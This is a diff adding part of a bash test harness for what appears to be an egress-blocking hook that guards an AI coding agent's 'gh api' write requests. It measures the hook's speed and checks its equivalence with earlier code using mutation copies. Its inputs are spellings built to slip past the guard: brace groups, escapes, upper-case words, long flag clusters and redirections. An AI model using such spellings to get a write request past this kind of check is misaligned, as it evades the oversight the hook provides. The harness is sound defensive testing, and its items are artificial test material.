+            pass
+    dog = threading.Timer(limit, stop)
+    dog.start()
+    r.communicate(data)
+    dog.cancel()
+    return None if stopped else (time.time() - t0, r.returncode)
+s, w = payload(shape), payload(twin)
+S, W = [], []
+for _ in range(reps):
+    S.append(one(s)); W.append(one(w))
+if None in S or None in W:
+    print("-1 -1 -1")
+else:
+    print("%.4f %.4f %d" % (min(x[0] for x in S), min(x[0] for x in W), max(x[1] for x in S + W)))'
+# e007_n_ratio <sandbox> <locale> <reps> <shape-file> <twin-file> [<bound>] — E007_N_OK is 1 when both run
+# inside the budget and are allowed and the shape costs at most <bound> (E007_N_BOUND when none is given)
+# times its twin; E007_N_OVER is 1 when the watchdog stopped a run, or both were allowed and the shape costs
+# more than that; E007_N_RATIO is the shape's cost over its twin's, or "stopped".
+e007_n_ratio() {
+  local out s w x b="${6:-$E007_N_BOUND}"
+  /usr/bin/printf '%s' enforce > "$1/.claude/hooks/.mode"
+  out="$(/usr/bin/python3 -c "$E007_N_PY" "$1" "$2" "$3" "$(( E007_T_LIMIT / 10 ))" "$4" "$5" 2>/dev/null)" || out="-1 -1 -1"
+  s="${out%% *}"; out="${out#* }"; w="${out%% *}"; x="${out#* }"
+  E007_N_OK=0; E007_N_OVER=0; E007_N_RATIO=stopped
+  if [ "$s" = -1 ]; then E007_N_OVER=1; return 0; fi
+  E007_N_RATIO="$(/usr/bin/awk -v s="$s" -v w="$w" 'BEGIN { printf "%.2f", (w > 0 ? s / w : 0) }')"
+  if /usr/bin/awk -v s="$s" -v w="$w" -v b="$b" 'BEGIN { exit !(w > 0 && s <= b * w) }'; then
+    [ "$x" != 0 ] || E007_N_OK=1
+  else
+    [ "$x" != 0 ] || E007_N_OVER=1
+  fi
+}
+# e007_n_cmd <bytes> <head> <unit> <tail> <file> — the head, as many whole units as fit, then the tail,
+# built by doubling.
+e007_n_cmd() {
+  H="$2" U="$3" T="$4" LC_ALL=C /usr/bin/awk -v n="$1" 'BEGIN { h = ENVIRON["H"]; u = ENVIRON["U"]; t = ENVIRON["T"]
+    m = int((n - length(h) - length(t)) / length(u)) * length(u); r = u
+    while (length(r) < m) r = r r
+    printf "%s", h substr(r, 1, m) t }' > "$5"
+}
+# e007_n_timed <label> <arm> <shape> <head> <unit> <tail> <twin-head> <twin-unit> <twin-tail> [<bound>] — the
+# shape's ratio arms at 10, 20, 40 and 80 KB in both locales against its twin, numbered on from E007_N_K, each
+# held to <bound> (E007_N_BOUND when none is given).
+e007_n_timed() {
+  local kb loc b="${10:-$E007_N_BOUND}"
+  for kb in 10 20 40 80; do
+    e007_n_cmd $(( kb * 1024 )) "$4" "$5" "$6" "${E007_N_R}/$3-${kb}.cmd"
+    e007_n_cmd $(( kb * 1024 )) "$7" "$8" "$9" "${E007_N_R}/$3-${kb}.twin"
+    for loc in en_US.UTF-8 C; do
+      E007_N_K=$(( E007_N_K + 1 ))
+      e007_n_ratio "$E007_W_S" "$loc" 3 "${E007_N_R}/$3-${kb}.cmd" "${E007_N_R}/$3-${kb}.twin" "$b"
+      if [ "$E007_N_OK" = 1 ]; then
+        e007_d_pass "$2${E007_N_K}: $1 at ${kb} KB in ${loc} costs the whole hook within ${b} times its neutral twin, inside the budget, and both are allowed"
+      else
+        e007_d_fail "$2${E007_N_K}: $1 at ${kb} KB in ${loc} costs the whole hook within ${b} times its neutral twin, inside the budget, and both are allowed — measured ratio ${E007_N_RATIO}, bound ${b}" \
+          "\"stopped\" is the watchdog ending a run at the budget; a ratio within the bound fails only on a refusal"
+      fi
+    done
+  done
+}
+# e007_n_ctl <arm> <copy> <shape> <kb> <locale> <what> [<bound>] — the copy with the code before its change is
+# beyond <bound> (E007_N_BOUND when none is given) on the shape: the instrument sees the step's cost.
+e007_n_ctl() {
+  local b="${7:-$E007_N_BOUND}"
+  e007_n_ratio "$2" "$5" 2 "${E007_N_R}/$3-$4.cmd" "${E007_N_R}/$3-$4.twin" "$b"
+  if [ "$E007_N_OVER" = 1 ]; then
+    e007_d_pass "$1: the copy with $6 as before is beyond ${b} times its neutral twin on the $3 shape at $4 KB in $5 — the instrument sees its cost"
+  else
+    e007_d_fail "$1: the copy with $6 as before is beyond the bound on the $3 shape (BROKEN PROBE) — measured ratio ${E007_N_RATIO}, bound ${b}" \
+      "a copy within the bound cannot show the timed arms measure anything"
+  fi
+}
+# e007_n_splice <in> <out> <from> <to> — <in> with its one occurrence of <from> replaced by <to>; fails
+# unless <from> occurs exactly once.
+e007_n_splice() {
+  /usr/bin/python3 -c 'import sys
+s = open(sys.argv[1], "rb").read()
+f, t = (a.encode("utf-8", "surrogateescape") for a in sys.argv[3:5])
+if s.count(f) != 1:
+    sys.exit(1)
+open(sys.argv[2], "wb").write(s.replace(f, t))' "$1" "$2" "$3" "$4"
+}
+# e007_n_lift <src> <out> <function>... — each named function the file holds, in the order named.
+e007_n_lift() {
+  /usr/bin/python3 -c 'import sys
+L = open(sys.argv[1], "rb").read().split(b"\n")
+out = []
+for nm in sys.argv[3:]:
+    h = nm.encode() + b"() {"
+    i = next((k for k, l in enumerate(L) if l.startswith(h)), None)
+    if i is None:
+        continue
+    j = i
+    while L[j] != b"}":
+        j += 1
+    out += L[i:j + 1]
+open(sys.argv[2], "wb").write(b"\n".join(out) + b"\n")' "$@"
+}
+E007_N_FUNCS="egress_long egress_cat egress_split_bs egress_split_at egress_brace_words egress_unescape_rv egress_unescape_long egress_fold_rv egress_respell_word egress_norm_at egress_is_redirection egress_restore_quoted_ops egress_short_flags egress_base_gh"
+# The dense set: words (w-*) and token lists (l-*), from a fixed generator.
+/usr/bin/python3 -c 'import os, random, sys
+d = sys.argv[1]; R = random.Random(8635); n = 0
+U = [b"a", b"B", b"gh", b"GH", b"api", b"i", b"iii", b"X", b"f", b"H", b"=", b"{", b"}", b",", b",,", b"/", b"\\",
+     b"\\\\", b"$", b".", b"..", b"1", b"123", b"{a,b}", b"{gh,api}", b"{name}", b"{1x}", b"<", b">", b">>", b"&", b"|",
+     b"\x01", b"\x04", b"\x05", b"\x06", b"\x7f", b"\xc3\xa9", b"\xe6\x97\xa5", b"\xff", b"\xc3", b"*", b"?", b"["]
+T = [b"", b"}", b",", b"{", b"/", b"/gh", b"\\", b">", b"}>x", b"i", b"X", b"\xff", b"\xc3"]
+def put(k, s):
+    global n
+    n += 1
+    open(os.path.join(d, "%s-%04d" % (k, n)), "wb").write(s)
+def word(L):
+    s = b""
+    while len(s) < L:
+        s += R.choice(U)
+    return s
+for L in (0, 1, 2, 3, 5, 8, 13, 40, 250, 256, 300, 900):
+    for _ in range(9 if L < 900 else 3):
+        put("w", word(L) + R.choice(T))
+for h in (b"{gh,api}", b"{,}", b"{a,}", b"{,a}", b"{a,,b}", b"x{a,b}y", b"{a,b}{c,d}", b"{a}", b"a{b,c", b"a}b{c,d",
+          b"{a,b}}", b"{{a,b}", b"pre{,}post", b"{\xc3\xa9,\xff}", b"{a\x7f,b}", b"1>", b"12>>", b"{fd}>", b"{fd}>&",
+          b"{f-d}>", b"{fd}", b"1" * 300 + b">x", b"{" + b"a" * 300 + b"}>", b"{" + b"a" * 300, b"\x01>", b"iX", b"iiX",
+          b"iXPOST", b"iX=POST", b"ii", b"iF", b"i" * 300 + b"H", b"i" * 300, b"i\xff", b"x" * 300 + b"/gh", b"/" + b"x" * 300):
+    put("w", h)
+V = [b"a", b"gh", b"api", b"{gh,api}", b"{a,b,c}", b"\x05", b"x\x05y", b"\x06", b"<", b">x", b"2>", b"-X", b"POST",
+     b"\\gh", b"G\\H", b"GH", b"do", b"\xc3\xa9", b"\xff", b"\x7f", b"{,}", b"{a,}"]
+for k in range(48):
+    t = [R.choice(V) for _ in range(R.choice((1, 2, 3, 5, 8, 20)))]
+    if k % 6 == 0:
+        t.append(b"{" + b"w," * R.choice((3, 300)) + b"z}")
+    if k % 9 == 0:
+        t.append(b"\x05" * 300)
+    put("l", b" ".join(t))' "${E007_N_R}/in"
+# The program each EQ arm runs: every changed function on every word and list, one record each.
+/bin/cat > "${E007_N_R}/eval.sh" <<'E007_N_EVAL'
+set -euo pipefail
+readonly TR=/usr/bin/tr
+readonly EGRESS_SENT=$'\001' EGRESS_RSP=$'\004' EGRESS_QLT=$'\005' EGRESS_QGT=$'\006'
+readonly EGRESS_UC='ABCDEFGHIJKLMNOPQRSTUVWXYZ' EGRESS_LC='abcdefghijklmnopqrstuvwxyz'
+EGRESS_LINEAR_MIN=256
+. "$1"
+dumpa() { local n="$1" k; eval "for k in \"\${!$n[@]}\"; do printf '[%s]=%q ' \"\$k\" \"\${$n[\$k]}\"; done"; printf '\n'; }
+exec > "$3"
+for f in "$2"/w-*; do
+  w="$(/bin/cat "$f"; printf x)"; w="${w%x}"
+  printf '== %s\n' "${f##*/}"
+  st=0; EGRESS_RV=(); EGRESS_RVN=0; EGRESS_RVCH=0; egress_brace_words "$w" || st=$?
+  printf 'brace %s %s %s\n' "$st" "$EGRESS_RVN" "$EGRESS_RVCH"; [ "$st" -ne 0 ] || dumpa EGRESS_RV
+  for steps in abc ab; do
+    egress_respell_word "$w" "$steps"; printf 'respell %s %s %s %s\n' "$steps" "$EGRESS_RVN" "$EGRESS_RVCH" "$EGRESS_RVFOLD"; dumpa EGRESS_RV
+  done
+  for pfx in '' 1; do
+    st=0; EGRESS_RDR_OP=x; egress_is_redirection "${pfx}${w}" || st=$?; printf 'redir %s %s\n' "$st" "$EGRESS_RDR_OP"
+  done
+  for nxt in yes no; do
+    egress_tok="-$w"
+    if [ "$nxt" = yes ]; then egress_toks=( x "-$w" "V A" z ); else egress_toks=( x "-$w" ); fi
+    egress_idx=1; egress_method=""; egress_explicit=0; egress_implicit=0
+    egress_short_flags
+    printf 'flags %s %s %q %s %s\n' "$nxt" "$egress_idx" "$egress_method" "$egress_explicit" "$egress_implicit"
+  done
+done
+for f in "$2"/l-*; do
+  c="$(/bin/cat "$f"; printf x)"; c="${c%x}"
+  printf '== %s\n' "${f##*/}"
+  set -f
+  # shellcheck disable=SC2206
+  base=( $c )
+  set +f
+  [ "${#base[@]}" -gt 0 ] || continue
+  egress_toks=( "${base[@]}" ); egress_restore_quoted_ops; printf 'restore\n'; dumpa egress_toks
+  n="${#base[@]}"; [ "$n" -le 10 ] || n=10
+  for fl in empty dense sparse; do
+    i=0
+    while [ "$i" -lt "$n" ]; do
+      egress_toks=( "${base[@]}" ); egress_tflag=()
+      case "$fl" in
+        dense) j=0; while [ "$j" -lt "${#base[@]}" ]; do egress_tflag[$j]=$(( j % 2 )); j=$(( j + 1 )); done ;;
+        sparse) egress_tflag[1]=""; egress_tflag[2]=1; egress_tflag[3]=0; egress_tflag[40]=1 ;;
+      esac
+      egress_cfold=x; egress_norm_at "$i" abc
+      printf 'norm %s %s %s\n' "$fl" "$i" "$egress_cfold"; dumpa egress_toks; dumpa egress_tflag
+      i=$(( i + 1 ))
+    done
+  done
+done
+E007_N_EVAL
+# e007_n_eq <arm> <what> <before-copy> <near-miss-copy>... — the before-copy's changed functions against the
+# shipped hook's on the dense set in both locales: equal, and each near miss differs.
+e007_n_eq() {
+  local arm="$1" what="$2" before="$3" why="" loc m d k
+  shift 3
+  e007_n_lift "$E007_W_SRC" "${E007_N_R}/lib-ship.sh" $E007_N_FUNCS
+  e007_n_lift "$before" "${E007_N_R}/lib-before.sh" $E007_N_FUNCS
+  for loc in en_US.UTF-8 C; do
+    LC_ALL="$loc" /bin/bash "${E007_N_R}/eval.sh" "${E007_N_R}/lib-ship.sh" "${E007_N_R}/in" "${E007_N_R}/out-ship" \
+      || why="${why} [${loc}] the shipped functions did not run;"
+    LC_ALL="$loc" /bin/bash "${E007_N_R}/eval.sh" "${E007_N_R}/lib-before.sh" "${E007_N_R}/in" "${E007_N_R}/out-before" \
+      || why="${why} [${loc}] the code before did not run;"
+    /usr/bin/cmp -s "${E007_N_R}/out-ship" "${E007_N_R}/out-before" || why="${why} [${loc}] the shipped functions differ from the code before;"
+    [ -s "${E007_N_R}/out-ship" ] || why="${why} [${loc}] no record was written;"
+    k=0
+    for m in "$@"; do
+      k=$(( k + 1 ))
+      e007_n_lift "$m" "${E007_N_R}/lib-near.sh" $E007_N_FUNCS
+      LC_ALL="$loc" /bin/bash "${E007_N_R}/eval.sh" "${E007_N_R}/lib-near.sh" "${E007_N_R}/in" "${E007_N_R}/out-near" || true
+      /usr/bin/cmp -s "${E007_N_R}/out-ship" "${E007_N_R}/out-near" \
+        && why="${why} [${loc}] near miss ${k} reads like the shipped code (the comparison cannot see a difference);"
+    done
+  done
+  d="$(/bin/ls "${E007_N_R}/in" | /usr/bin/wc -l | /usr/bin/tr -d ' ')"
+  [ "$d" -ge 150 ] || why="${why} only ${d} inputs were written;"
+  if [ -z "$why" ]; then
+    e007_d_pass "${arm}: ${what} equals the code before it byte for byte on ${d} dense words and token lists in UTF-8 and C, and $# near misses each differ"
+  else
+    e007_d_fail "${arm}: ${what} equals the code before it byte for byte" "$why"
+  fi
+}
+# e007_n_copy <dir> <from> <to> [<from> <to> ...] — <dir>/mut.sh, the shipped hook with each text spliced in
+# turn, installed as the hook of a sandbox rooted at <dir>; E007_N_CW counts the splices that did not apply.
+e007_n_copy() {
+  local dir="$1"
+  shift
+  E007_N_CW=0
+  /bin/mkdir -p "$dir"
+  /bin/cp "$E007_W_SRC" "${dir}/mut.sh"
+  while [ "$#" -ge 2 ]; do
+    if e007_n_splice "${dir}/mut.sh" "${dir}/mut.next" "$1" "$2"; then
+      /bin/mv "${dir}/mut.next" "${dir}/mut.sh"
+    else
+      E007_N_CW=$(( E007_N_CW + 1 ))
+    fi
+    shift 2
+  done
+  e007_v_sandbox "$dir" "${dir}/mut.sh"
+}
+# e007_n_before <dir> <function>... — a sandbox at <dir> whose hook is the shipped one with each named
+# function put back as it was before this pass (from the file below); E007_N_CW counts the functions that
+# could not be put back.
+e007_n_before() {
+  local dir="$1"
+  shift
+  /bin/mkdir -p "$dir"
+  E007_N_CW="$(/usr/bin/python3 -c 'import sys
+def blocks(b):
+    L = b.split(b"\n"); out = {}; i = 0
+    while i < len(L):
+        l = L[i]
+        if l.endswith(b"() {") and not l.startswith(b" "):
+            j = i
+            while L[j] != b"}":
+                j += 1
+            out.setdefault(l[:-4], []).append(b"\n".join(L[i:j + 1]))
+            i = j
+        i += 1
+    return out
+src = open(sys.argv[1], "rb").read(); old = blocks(open(sys.argv[2], "rb").read()); have = blocks(src); bad = 0
+for nm in sys.argv[4:]:
+    k = nm.encode()
+    if len(have.get(k, [])) != 1 or len(old.get(k, [])) != 1 or src.count(have[k][0]) != 1:
+        bad += 1
+        continue
+    src = src.replace(have[k][0], old[k][0])
+open(sys.argv[3], "wb").write(src)
+print(bad)' "$E007_W_SRC" "${E007_N_R}/before-funcs.sh" "${dir}/mut.sh" "$@" 2>/dev/null)" || E007_N_CW=x
+  e007_v_sandbox "$dir" "${dir}/mut.sh"
+}
+# The changed functions as they were before this pass, verbatim.
+/bin/cat > "${E007_N_R}/before-funcs.sh" <<'E007_N_BEFORE'
+egress_brace_words() {
+  local w="$1" pre rest mid post alt k=0 last=0
+  case "$w" in *'{'*','*'}'*) ;; *) return 1 ;; esac
+  case "$w" in *\\*|*'$'*|*/*|*..*|*"${EGRESS_SENT}"*) return 1 ;; esac
+  pre="${w%%\{*}"
+  rest="${w#*\{}"
+  mid="${rest%%\}*}"
+  post="${rest#*\}}"
+  case "${pre}${mid}${post}" in *'{'*|*'}'*) return 1 ;; esac
+  case "$mid" in *,*) ;; *) return 1 ;; esac
+  EGRESS_BW=()
+  while [ "$last" -eq 0 ]; do
+    case "$mid" in
+      *,*) alt="${mid%%,*}"; mid="${mid#*,}" ;;
+      *) alt="$mid"; last=1 ;;
+    esac
+    if [ -n "${pre}${alt}${post}" ]; then
+      EGRESS_BW[$k]="${pre}${alt}${post}"
+      k=$(( k + 1 ))
+    fi
+  done
+  [ "$k" -gt 0 ] || return 1
+  EGRESS_RV=( "${EGRESS_BW[@]}" )
+  EGRESS_RVN="$k"
+  EGRESS_RVCH=1
+  return 0
+}
+egress_unescape_rv() {
+  local j=0 s out
+  while [ "$j" -lt "$EGRESS_RVN" ]; do
+    s="${EGRESS_RV[$j]}"
+    case "$s" in
+      *\\*)
+        out=""
+        if egress_long "$s"; then egress_unescape_long "$s"; out="$EGRESS_J"; s=""; fi  # linear: unescape
+        while : ; do
+          case "$s" in
+            *\\*) ;;
+            *) out="${out}${s}"; break ;;
+          esac
+          out="${out}${s%%\\*}"
+          s="${s#*\\}"
+          out="${out}${s:0:1}"
+          s="${s:1}"
+        done
+        EGRESS_RV[$j]="$out"
+        EGRESS_RVCH=1
+        ;;
+    esac
+    j=$(( j + 1 ))
+  done
+  return 0
+}
+egress_norm_at() {
+  local i="$1" n k j
+  egress_respell_word "${egress_toks[$i]}" "$2"
+  egress_cfold="$EGRESS_RVFOLD"
+  [ "$EGRESS_RVCH" -eq 1 ] || return 0
+  if [ "$EGRESS_RVN" -eq 1 ]; then
+    egress_toks[$i]="${EGRESS_RV[0]}"
+    egress_tflag[$i]=1
+    return 0
+  fi
+  n="${#egress_toks[@]}"
+  EGRESS_NT=(); EGRESS_NF=(); k=0; j=0
+  while [ "$j" -lt "$i" ]; do
+    EGRESS_NT[$k]="${egress_toks[$j]}"; EGRESS_NF[$k]="${egress_tflag[$j]:-0}"
+    k=$(( k + 1 )); j=$(( j + 1 ))
+  done
+  j=0
+  while [ "$j" -lt "$EGRESS_RVN" ]; do
+    EGRESS_NT[$k]="${EGRESS_RV[$j]}"; EGRESS_NF[$k]=1
+    k=$(( k + 1 )); j=$(( j + 1 ))
+  done
+  j=$(( i + 1 ))
+  while [ "$j" -lt "$n" ]; do
+    EGRESS_NT[$k]="${egress_toks[$j]}"; EGRESS_NF[$k]="${egress_tflag[$j]:-0}"
+    k=$(( k + 1 )); j=$(( j + 1 ))
+  done
+  egress_toks=( "${EGRESS_NT[@]}" )
+  egress_tflag=( "${EGRESS_NF[@]}" )
+  return 0
+}
+E007_N_BEFORE
+
+# -- NB: the normalization of a long brace group --
+E007_NB_B="${E007_W_BASE}/nbb"; e007_n_before "$E007_NB_B" egress_brace_words egress_unescape_rv egress_norm_at
+_nb_cw="$E007_N_CW"
+E007_NB_M1="${E007_W_BASE}/nbm1"; e007_n_copy "$E007_NB_M1" '*"$1") EGRESS_SP[${#EGRESS_SP[@]}]="" ;;' '*"$1") : ;;'; _nb_cw="${_nb_cw}${E007_N_CW}"
+E007_NB_M2="${E007_W_BASE}/nbm2"; e007_n_copy "$E007_NB_M2" 'for alt in "${EGRESS_SP[@]}"; do' 'for alt in "${EGRESS_SP[@]:1}"; do'; _nb_cw="${_nb_cw}${E007_N_CW}"
+E007_NB_M3="${E007_W_BASE}/nbm3"; e007_n_copy "$E007_NB_M3" 'for s in "${EGRESS_RV[@]}"; do  # linear: words' 'for s in "${EGRESS_RV[@]:1}"; do  # linear: words'; _nb_cw="${_nb_cw}${E007_N_CW}"
+E007_NB_M4="${E007_W_BASE}/nbm4"; e007_n_copy "$E007_NB_M4" '"${egress_toks[@]:$(( i + 1 ))}" )  # linear: splice' '"${egress_toks[@]:$(( i + 2 ))}" )  # linear: splice'; _nb_cw="${_nb_cw}${E007_N_CW}"
+E007_NB_M5="${E007_W_BASE}/nbm5"; e007_n_copy "$E007_NB_M5" 'D[$j]="${1:-0}"; shift' 'D[$j]=1; shift'; _nb_cw="${_nb_cw}${E007_N_CW}"
+if [ "$_nb_cw" = 000000 ]; then
+  e007_n_eq "AC-E007-NB-EQ" "the brace step, the escape step over a group's words and the splice" "${E007_NB_B}/mut.sh" \
+    "${E007_NB_M1}/mut.sh" "${E007_NB_M2}/mut.sh" "${E007_NB_M3}/mut.sh" "${E007_NB_M4}/mut.sh" "${E007_NB_M5}/mut.sh"
+else
+  e007_d_fail "AC-E007-NB-EQ: the brace step, the escape step over a group's words and the splice equal the code before them byte for byte" \
+    "the copies could not be built (put back, then each near miss: ${_nb_cw}; 0 = built)"
+fi
+# NB's ratio arms and its control are held to E007_NB_BOUND, its own bound; every other block keeps E007_N_BOUND.
+e007_n_timed "the long brace group" "AC-E007-NB" brace '{gh,' 'a,' 'a} api repos/o/r' 'gh api repos/o/r {' 'a,' 'a}' "$E007_NB_BOUND"
+e007_n_ctl "AC-E007-NB-CTL" "$E007_NB_B" brace 40 en_US.UTF-8 "the brace step, the escape step and the splice" "$E007_NB_BOUND"
+
+# -- NR: the redirection-word test on a long word before a redirection --
+E007_N_K=0
+/bin/cat >> "${E007_N_R}/before-funcs.sh" <<'E007_N_BEFORE'
+egress_is_redirection() {
+  local r="$1" nm
+  EGRESS_RDR_OP=0
+  r="${r#"${r%%[!0123456789]*}"}"
+  case "$r" in
+    '{'*)
+      nm="${r%%\}*}"
+      nm="${nm#\{}"
+      case "$nm" in ''|[!A-Za-z_]*|*[!A-Za-z0-9_]*) return 1 ;; esac
+      case "$r" in *'}'*) r="${r#*\}}" ;; *) return 1 ;; esac
+      ;;
+  esac
+  case "$r" in
+    '<'*|'>'*|"${EGRESS_SENT}>"*) ;;
+    *) return 1 ;;
+  esac
+  case "$r" in
+    '<'|'>'|'>>'|'<>'|'<<'|'<<-'|'<<<'|">${EGRESS_SENT}"|"<${EGRESS_SENT}"|"${EGRESS_SENT}>"|"${EGRESS_SENT}>>")
+      EGRESS_RDR_OP=1
+      ;;
+  esac
+  return 0
+}
+E007_N_BEFORE
+E007_NR_B="${E007_W_BASE}/nrb"; e007_n_before "$E007_NR_B" egress_is_redirection
+_nr_cw="$E007_N_CW"
+E007_NR_M1="${E007_W_BASE}/nrm1"; e007_n_copy "$E007_NR_M1" 'then r="${r:${#d}}"; fi  # linear: descriptor' 'then r="${r:1}"; fi  # linear: descriptor'; _nr_cw="${_nr_cw}${E007_N_CW}"
+E007_NR_M2="${E007_W_BASE}/nrm2"; e007_n_copy "$E007_NR_M2" 'r="${r:$(( ${#nm} + 2 ))}"' 'r="${r:$(( ${#nm} + 1 ))}"'; _nr_cw="${_nr_cw}${E007_N_CW}"
+if [ "$_nr_cw" = 000 ]; then
+  e007_n_eq "AC-E007-NR-EQ" "the redirection-word test" "${E007_NR_B}/mut.sh" "${E007_NR_M1}/mut.sh" "${E007_NR_M2}/mut.sh"
+else
+  e007_d_fail "AC-E007-NR-EQ: the redirection-word test equals the code before it byte for byte" \
+    "the copies could not be built (put back, then each near miss: ${_nr_cw}; 0 = built)"
+fi
+e007_n_timed "a long digit run before a redirection" "AC-E007-NR" digits 'gh api ' '1' ' >x repos/o/r' 'gh api ' 'a' ' >x repos/o/r'
+e007_n_timed "a long named-descriptor redirection" "AC-E007-NR" named 'gh api {' 'a' '}>x repos/o/r' 'gh api x' 'a' '}>x repos/o/r'
+e007_n_ctl "AC-E007-NR-CTL1" "$E007_NR_B" digits 40 en_US.UTF-8 "the redirection-word test"
+e007_n_ctl "AC-E007-NR-CTL2" "$E007_NR_B" named 80 C "the redirection-word test"
+
+# -- NQ: the restore of quoted operators over a segment of many tokens --
+E007_N_K=0
+/bin/cat >> "${E007_N_R}/before-funcs.sh" <<'E007_N_BEFORE'
+egress_restore_quoted_ops() {
+  local i=0 n="${#egress_toks[@]}" lp
+  case "${egress_toks[*]}" in
+    *"${EGRESS_QLT}"*|*"${EGRESS_QGT}"*) ;;
+    *) return 0 ;;
+  esac
+  while [ "$i" -lt "$n" ]; do
+    if [ "${#egress_toks[$i]}" -ge "$EGRESS_LINEAR_MIN" ] && lp="$(LC_ALL=C "$TR" '\005\006' '\074\076' <<< "${egress_toks[$i]}.")"; then egress_toks[$i]="${lp%.}"; fi  # linear: stand-in
+    egress_toks[$i]="${egress_toks[$i]//${EGRESS_QLT}/<}"
+    egress_toks[$i]="${egress_toks[$i]//${EGRESS_QGT}/>}"
+    i=$(( i + 1 ))
+  done
+  return 0
+}
+E007_N_BEFORE
+E007_NQ_B="${E007_W_BASE}/nqb"; e007_n_before "$E007_NQ_B" egress_restore_quoted_ops
+_nq_cw="$E007_N_CW"
+E007_NQ_M1="${E007_W_BASE}/nqm1"; e007_n_copy "$E007_NQ_M1" 'for t in "${egress_toks[@]}"; do  # linear: restore' 'for t in "${egress_toks[@]:1}"; do  # linear: restore'; _nq_cw="${_nq_cw}${E007_N_CW}"
+E007_NQ_M2="${E007_W_BASE}/nqm2"; e007_n_copy "$E007_NQ_M2" 'RQ[${#RQ[@]}]="$t"' 'RQ[${#RQ[@]}]="${t%?}"'; _nq_cw="${_nq_cw}${E007_N_CW}"
+if [ "$_nq_cw" = 000 ]; then
+  e007_n_eq "AC-E007-NQ-EQ" "the restore of quoted operators" "${E007_NQ_B}/mut.sh" "${E007_NQ_M1}/mut.sh" "${E007_NQ_M2}/mut.sh"
+else
+  e007_d_fail "AC-E007-NQ-EQ: the restore of quoted operators equals the code before it byte for byte" \
+    "the copies could not be built (put back, then each near miss: ${_nq_cw}; 0 = built)"
+fi
+e007_n_timed "a long run of quoted operator tokens" "AC-E007-NQ" qops "gh api '<' " 'a ' 'repos/o/r' "gh api 'x' " 'a ' 'repos/o/r'
+e007_n_ctl "AC-E007-NQ-CTL" "$E007_NQ_B" qops 80 C "the restore of quoted operators"
+
+# -- NF: the short-flag cluster reader on a long cluster --
+E007_N_K=0
+/bin/cat >> "${E007_N_R}/before-funcs.sh" <<'E007_N_BEFORE'
+egress_short_flags() {
+  local s="${egress_tok#-}" f v sep=0 hasv=1
+  while : ; do
+    case "$s" in
+      i*) s="${s#i}" ;;
+      *) break ;;
+    esac
+  done
+  f="${s:0:1}"
+  v="${s:1}"
+  case "$f" in
+    X|f|F|H|q|t|p) ;;
+    *) egress_idx=$(( egress_idx + 1 )); return 0 ;;
+  esac
+  case "$v" in
+    '') sep=1 ;;
+    '='?*) v="${v#=}" ;;
+  esac
+  if [ "$sep" -eq 1 ]; then
+    if [ $(( egress_idx + 1 )) -lt "${#egress_toks[@]}" ]; then
+      v="${egress_toks[$(( egress_idx + 1 ))]}"
+    else
+      hasv=0
+    fi
+  fi
+  case "$f" in
+    X) if [ "$hasv" -eq 1 ]; then egress_method="$v"; egress_explicit=1; fi ;;
+    f|F) egress_implicit=1 ;;
+  esac
+  egress_idx=$(( egress_idx + 1 + sep ))
+  return 0
+}
+E007_N_BEFORE
+E007_NF_B="${E007_W_BASE}/nfb"; e007_n_before "$E007_NF_B" egress_short_flags
+_nf_cw="$E007_N_CW"
+E007_NF_M1="${E007_W_BASE}/nfm1"; e007_n_copy "$E007_NF_M1" 'run="${s%%[!i]*}"' 'run="${s%%[!iX]*}"'; _nf_cw="${_nf_cw}${E007_N_CW}"
+E007_NF_M2="${E007_W_BASE}/nfm2"; e007_n_copy "$E007_NF_M2" 'then s="${s:${#run}}"; fi  # linear: cluster' 'then s="${s:1}"; fi  # linear: cluster'; _nf_cw="${_nf_cw}${E007_N_CW}"
+if [ "$_nf_cw" = 000 ]; then
+  e007_n_eq "AC-E007-NF-EQ" "the short-flag cluster reader" "${E007_NF_B}/mut.sh" "${E007_NF_M1}/mut.sh" "${E007_NF_M2}/mut.sh"
+else
+  e007_d_fail "AC-E007-NF-EQ: the short-flag cluster reader equals the code before it byte for byte" \
+    "the copies could not be built (put back, then each near miss: ${_nf_cw}; 0 = built)"
+fi
+e007_n_timed "a long short-flag cluster" "AC-E007-NF" cluster 'gh api -' 'i' 'H x repos/o/r' 'gh api -H' 'i' ' x repos/o/r'
+e007_n_ctl "AC-E007-NF-CTL" "$E007_NF_B" cluster 40 en_US.UTF-8 "the short-flag cluster reader"
+
+# -- NH: the head walk's basename read of a long command word --
+#
+# The widened fast path hands the walk a long command word in an upper-case or escaped spelling, which the
+# fast path before this release skipped, and the walk's keyword-and-prefix test and its verb test each took
+# that word's basename by a removal that retries its match at every position. Each now reads a long word
+# once: the first from its last eight characters, the second by egress_base_gh. They are lines of the rule's
+# body, so NH-EQ compares the whole hook, with the phase forced, against the copy with both lines as before,
+# on commands whose long words end in every basename the walk tests — a keyword, a prefix word, gh, the same
+# words with no slash before them, a word longer than any — and with a slash at either end, each command word
+# alone, behind a long prefix word and behind a long word that ends in one, in both locales: the same exit
+# and the same records; and two near misses, a tail one character short and the verb test on the wrong
+# token, each differ.
+E007_N_K=0
+_nh_ph='readonly EGRESS_007_WIDENING_PHASE="shadow"'
+_nh_pe='readonly EGRESS_007_WIDENING_PHASE="enforce"'
+_nh_hw='if egress_long "$egress_raw"; then egress_raw="${egress_raw:$(( ${#egress_raw} - 8 ))}"; fi  # linear: head-word'
+_nh_vb='egress_base_gh "${egress_toks[$egress_hidx]}" || continue  # linear: verb'
+_nh_vo='case "${egress_toks[$egress_hidx]##*/}" in gh) ;; *) continue ;; esac'
+E007_NH_S="${E007_W_BASE}/nhs"; e007_n_copy "$E007_NH_S" "$_nh_ph" "$_nh_pe"; _nh_cw="$E007_N_CW"
+E007_NH_B="${E007_W_BASE}/nhb"; e007_n_copy "$E007_NH_B" "$_nh_ph" "$_nh_pe" "$_nh_hw" ':' "$_nh_vb" "$_nh_vo"; _nh_cw="${_nh_cw}${E007_N_CW}"
+E007_NH_M1="${E007_W_BASE}/nhm1"; e007_n_copy "$E007_NH_M1" "$_nh_ph" "$_nh_pe" '${#egress_raw} - 8 ))' '${#egress_raw} - 7 ))'; _nh_cw="${_nh_cw}${E007_N_CW}"
+E007_NH_M2="${E007_W_BASE}/nhm2"; e007_n_copy "$E007_NH_M2" "$_nh_ph" "$_nh_pe" "$_nh_vb" 'egress_base_gh "${egress_toks[$(( egress_hidx + 1 ))]}" || continue  # linear: verb'; _nh_cw="${_nh_cw}${E007_N_CW}"
+_nh_x="$(/usr/bin/awk 'BEGIN { s = "x"; while (length(s) < 300) s = s s; printf "%s", substr(s, 1, 300) }')"
